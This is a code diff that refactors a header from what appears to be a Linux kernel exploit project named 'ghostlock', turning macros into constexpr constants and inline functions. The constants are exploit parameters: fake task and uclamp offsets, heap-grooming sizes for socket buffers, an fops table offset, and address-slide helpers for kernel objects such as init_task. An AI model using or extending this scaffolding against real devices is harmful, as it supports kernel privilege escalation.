@@ -7,6 +7,7 @@
 #define __ARM 1
 
 #include "offset.h"
+#include "runtime_struct_offsets.h"
 #include "memory/address_space.h"
 #include "memory/payload_builder.h"
 #include "session/runtime_config.h"
@@ -15,10 +16,10 @@
 #include "pi_race.h"
 #include "session/exploit_session.hpp"
 
-#define PAGE_SHIFT 12
-#define PAGE_SIZE (1UL << PAGE_SHIFT)
-#define KS_PAGE_SIZE 4096
-#define KS_PAGE_MASK 0xfffULL
+inline constexpr unsigned PAGE_SHIFT = 12;
+inline constexpr unsigned long PAGE_SIZE = 1UL << PAGE_SHIFT;
+inline constexpr unsigned KS_PAGE_SIZE = 4096;
+inline constexpr unsigned long long KS_PAGE_MASK = 0xfffULL;
 
 #include <dirent.h>
 #include <cerrno>
@@ -49,45 +50,32 @@
 
 #include "kernelsnitch/utils.h"
 
-#define SKB_DATA_DELTA (-0xe80LL)
-#define MM_STRUCT_SZ 0x500
+inline constexpr long long SKB_DATA_DELTA = -0xe80LL;
+inline constexpr unsigned long MM_STRUCT_SZ = 0x500;
 
-#define MM_ORDER 3
-#define MM_PARTIALS 5
-#define kernelsnitch_collisions() _RSO(kernelsnitch_collisions, 4)
+inline constexpr unsigned MM_ORDER = 3;
+inline constexpr unsigned MM_PARTIALS = 5;
 
-#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
-#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
-#define SKB_RECLAIM_SENDS 4
-#define FOPS_TABLE_OFF FOPS_OFF
-#define SKB_FRAG_BIAS 0
+inline constexpr unsigned long ORDER3_SIZE = PAGE_SIZE << MM_ORDER;
+inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 2;
+inline constexpr unsigned SKB_RECLAIM_SENDS = 4;
+inline constexpr unsigned long FOPS_TABLE_OFF = FOPS_OFF;
+inline constexpr int SKB_FRAG_BIAS = 0;
 
-#define FAKE_TASK_PRIO 120
-#define FAKE_WAITER_PRIO 140
-#define FAKE_TASK_UCLAMP_REQ_OFF 0x350
-#define FAKE_TASK_UCLAMP_OFF 0x358
-#define FAKE_UCLAMP_ACTIVE_BIT 16
-#define FAKE_UCLAMP_MIN_ACTIVE (1U << FAKE_UCLAMP_ACTIVE_BIT)
-#define FAKE_UCLAMP_MAX_ACTIVE \
-  (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT))
+inline constexpr int FAKE_TASK_PRIO = 120;
+inline constexpr int FAKE_WAITER_PRIO = 140;
+inline constexpr unsigned FAKE_TASK_UCLAMP_REQ_OFF = 0x350;
+inline constexpr unsigned FAKE_TASK_UCLAMP_OFF = 0x358;
+inline constexpr unsigned FAKE_UCLAMP_ACTIVE_BIT = 16;
+inline constexpr unsigned FAKE_UCLAMP_MIN_ACTIVE = 1U << FAKE_UCLAMP_ACTIVE_BIT;
+inline constexpr unsigned FAKE_UCLAMP_MAX_ACTIVE =
+    (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT));
 
-#define TASK_COMM_LEN 16
+inline constexpr unsigned TASK_COMM_LEN = 16;
 
-#define PSELECT_ROUTE_NFDS 320
-#define PSELECT_CONSUMER_NICE 19
-#define PSELECT_CONSUMER_SETTLE_USEC 250000
-#define SLIDE_NFULNL_LOGGER \
-  g_exploit_session.addresses.data_alias(SLIDE_NFULNL_LOGGER_IMAGE)
-#define SLIDE_LOGGERS_0_1 \
-  g_exploit_session.addresses.data_alias(SLIDE_LOGGERS_0_1_IMAGE)
-#define SLIDE_RANDOM_BOOT_ID_DATA \
-  g_exploit_session.addresses.data_alias(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE)
-#define SLIDE_INIT_TASK \
-  g_exploit_session.addresses.data_alias(SLIDE_INIT_TASK_IMAGE)
-#define SLIDE_ROOT_TASK_GROUP \
-  g_exploit_session.addresses.data_alias(SLIDE_ROOT_TASK_GROUP_IMAGE)
-#define SLIDE_SYSCTL_BOOTID \
-  g_exploit_session.addresses.data_alias(SLIDE_SYSCTL_BOOTID_IMAGE)
+inline constexpr unsigned PSELECT_ROUTE_NFDS = 320;
+inline constexpr int PSELECT_CONSUMER_NICE = 19;
+inline constexpr unsigned PSELECT_CONSUMER_SETTLE_USEC = 250000;
 
 namespace ghostlock {
 
@@ -107,6 +95,33 @@ struct local_sched_attr {
 extern uint64_t g_direct_map_end;
 
 } // namespace ghostlock
+
+namespace ghostlock::profile {
+
+inline uint32_t kernelsnitch_collisions() {
+    return symbol_u32(&kernel_offsets::kernelsnitch_collisions, 4);
+}
+
+inline uintptr_t slide_nfulnl_logger() {
+    return g_exploit_session.addresses.data_alias(slide_nfulnl_logger_image());
+}
+inline uintptr_t slide_loggers_0_1() {
+    return g_exploit_session.addresses.data_alias(slide_loggers_0_1_image());
+}
+inline uintptr_t slide_random_boot_id_data() {
+    return g_exploit_session.addresses.data_alias(slide_random_boot_id_data_image());
+}
+inline uintptr_t slide_init_task() {
+    return g_exploit_session.addresses.data_alias(slide_init_task_image());
+}
+inline uintptr_t slide_root_task_group() {
+    return g_exploit_session.addresses.data_alias(slide_root_task_group_image());
+}
+inline uintptr_t slide_sysctl_bootid() {
+    return g_exploit_session.addresses.data_alias(slide_sysctl_bootid_image());
+}
+
+} // namespace ghostlock::profile
 
 namespace ghostlock::support {
     void read_first_line(const char *path, char *buf, size_t len);
